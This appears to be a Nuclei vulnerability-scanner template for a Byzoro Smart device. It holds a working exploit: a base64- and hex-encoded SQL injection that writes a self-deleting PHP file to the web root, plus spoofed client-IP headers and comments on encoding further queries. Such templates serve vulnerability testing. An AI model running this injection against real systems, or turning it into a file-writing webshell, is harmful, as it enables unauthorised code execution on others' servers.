@@ -1,0 +1,67 @@
+id: byzoro-smart-rce-injection 
+info:
+  name: byzoro-smart-rce-injection
+  author: apple
+  severity: high
+  description: sql参数先base64解码在hex解码，解码地址在reference.
+  reference:
+    - https://base64.us/
+    - https://tool.lu/hexstr/
+    - https://github.com/cugerQDHJ/cve/blob/main/rce.md
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /importexport.php?sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyODZkNjQzNTI4MzEyOTI5M2IyMDc1NmU2YzY5NmU2YjI4NWY1ZjQ2NDk0YzQ1NWY1ZjI5M2IyMDNmM2UgaW50byBvdXRmaWxlICcvdXNyL2hkZG9jcy9uc2cvYXBwL3Rlc3QucGhwJw===&type=exportexcelbysql HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=a788fdbfab0fac8c8beb78201336edaa
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+        Sec-Fetch-User: ?1
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-Ip: 127.0.0.1
+        X-Remote-Ip: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        Sec-Ch-Ua-Platform: "Windows"
+        Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
+        Sec-Ch-Ua-Mobile: ?0
+        Te: trailers
+        Connection: close
+
+      - |
+        GET /app/test.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=a788fdbfab0fac8c8beb78201336edac
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+        Sec-Fetch-User: ?1
+        Sec-Ch-Ua-Platform: "Windows"
+        Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
+        Sec-Ch-Ua-Mobile: ?0
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-Ip: 127.0.0.1
+        X-Remote-Ip: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        Te: trailers
+        Connection: close
+        Content-Length: 0
+    matchers:
+      - type: word
+        part: body
+        words:
+          - c4ca4238a0b923820dcc509a6f75849b
+#备注说明：
+#1.这是个get请求，可以直接用浏览器访问，建议使用火狐浏览器访问，chrome的安全级别高可能打不开加密链接。
+#2.sql=c2VsZWN0IDEsbWQ1KDEwMjEwMzEyMik=是计算102103122的DM5值,即：select 1,md5(102103122),sql=c2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCk=是sql#语句使用base64加密后的内容，原文：sql=select 1,database(),version()
